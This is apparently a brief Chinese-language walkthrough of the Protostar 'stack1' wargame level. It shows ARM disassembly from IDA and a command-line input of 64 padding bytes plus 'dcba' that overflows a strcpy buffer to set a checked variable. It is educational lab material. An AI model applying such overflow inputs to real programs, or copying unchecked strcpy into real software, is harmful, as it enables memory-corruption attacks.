#stack1
@(protostar)
直接扔进IDA
```armasm
.text:000104B0 main                                    ; DATA XREF: _start+20o
.text:000104B0                                         ; .text:off_103BCo
.text:000104B0
.text:000104B0 var_54          = -0x54
.text:000104B0 var_50          = -0x50
.text:000104B0 dest            = -0x48
.text:000104B0 var_8           = -8
.text:000104B0
.text:000104B0                 STMFD   SP!, {R11,LR}
.text:000104B4                 ADD     R11, SP, #4
.text:000104B8                 SUB     SP, SP, #0x50
.text:000104BC                 STR     R0, [R11,#var_50]
.text:000104C0                 STR     R1, [R11,#var_54]
.text:000104C4                 LDR     R3, [R11,#var_50]
.text:000104C8                 CMP     R3, #1
.text:000104CC                 BNE     loc_104DC
.text:000104D0                 MOV     R0, #1          ; status
.text:000104D4                 LDR     R1, =aPleaseSpecifyA ; "please specify an argument\n"
.text:000104D8                 BL      errx
.text:000104DC ; ---------------------------------------------------------------------------
.text:000104DC
.text:000104DC loc_104DC                               ; CODE XREF: main+1Cj
.text:000104DC                 MOV     R3, #0
.text:000104E0                 STR     R3, [R11,#var_8]
.text:000104E4                 LDR     R3, [R11,#var_54]
.text:000104E8                 ADD     R3, R3, #4//神奇
.text:000104EC                 LDR     R3, [R3]//将参数传入R3，[R3]为argv[1]的地址，很神奇
.text:000104F0                 SUB     R2, R11, #-dest
.text:000104F4                 MOV     R0, R2          ; dest
.text:000104F8                 MOV     R1, R3          ; src
.text:000104FC                 BL      strcpy
.text:00010500                 LDR     R3, [R11,#var_8]
.text:00010504                 LDR     R2, =0x61626364
.text:00010508                 CMP     R3, R2
.text:0001050C                 BNE     loc_1051C
.text:00010510                 LDR     R0, =aYouHaveCorrect ; "you have correctly got the variable to "...
.text:00010514                 BL      puts
.text:00010518                 B       loc_1052C
.text:0001051C ; ---------------------------------------------------------------------------
.text:0001051C
.text:0001051C loc_1051C                               ; CODE XREF: main+5Cj
.text:0001051C                 LDR     R3, [R11,#var_8]
.text:00010520                 LDR     R0, =aTryAgainYouGot ; "Try again, you got 0x%08x\n"
.text:00010524                 MOV     R1, R3
.text:00010528                 BL      printf
.text:0001052C
.text:0001052C loc_1052C                               ; CODE XREF: main+68j
.text:0001052C                 MOV     R0, R3
.text:00010530                 SUB     SP, R11, #4
.text:00010534                 LDMFD   SP!, {R11,PC}
.text:00010534 ; End of function main
```

由`.text:00010504   LDR     R2, =0x61626364`可知，把变量modify修改成0x61626364即可，buf和modify直接有0x40个字节的空间。
```bash
~/p/s/stack1 (master) $ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAabcd
Try again, you got 0x64636261
~/p/s/stack1 (master) $ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
```
